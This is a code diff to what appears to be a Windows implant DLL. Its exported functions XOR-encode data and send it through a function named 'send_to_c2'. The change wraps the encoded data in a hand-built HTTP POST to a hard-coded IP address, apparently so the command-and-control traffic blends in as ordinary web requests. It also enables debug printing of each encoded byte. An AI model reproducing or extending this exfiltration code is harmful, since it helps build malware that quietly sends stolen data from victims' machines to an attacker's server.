@@ -12,6 +12,7 @@
 #include <stdlib.h>
 #include "networking.h"
 #include <iostream>
+#include <string>
 
 #define DEFAULT_BUFLEN 32
 
@@ -95,7 +96,17 @@ __declspec(dllexport) int send_to_c2(char *encrypted_data, SOCKET ConnectSocket)
 
 	std::cout << " --- Sending to Socket " << std::endl;
 
-	iResult = send(ConnectSocket, encrypted_data, (int) strlen(encrypted_data), 0);
+	// Add on HTTP header
+	std::string str(encrypted_data);
+	std::string header = "POST / HTTP/1.1\r\nHost: 13.56.156.46\r\nContent-Type: text/plain\r\nContent-Length: ";
+	header += std::to_string(str.length());
+	header += "\r\n\r\n" + str;
+
+	char* message = new char[header.length() + 1];
+	strcpy(message, header.c_str());
+	std::cout << message << std::endl;
+
+	iResult = send(ConnectSocket, message, (int) strlen(message), 0);
 	if(iResult == SOCKET_ERROR){
 		std::cout << "send failed: " << WSAGetLastError() << std::endl;
 		closesocket(ConnectSocket);
@@ -150,7 +161,7 @@ __declspec(dllexport) char *encryption(char *decrypted_data){
 		//encrypted_data += 1;
 		//std::cout << int(decrypted_data[i]) << " - ";
 		decrypted_data[i] = decrypted_data[i] ^ XOR_key;
-		//std::cout << int(decrypted_data[i]) << std::endl; 
+		std::cout << int(decrypted_data[i]) << std::endl; 
 	}
 
 	std::cout << std::endl;
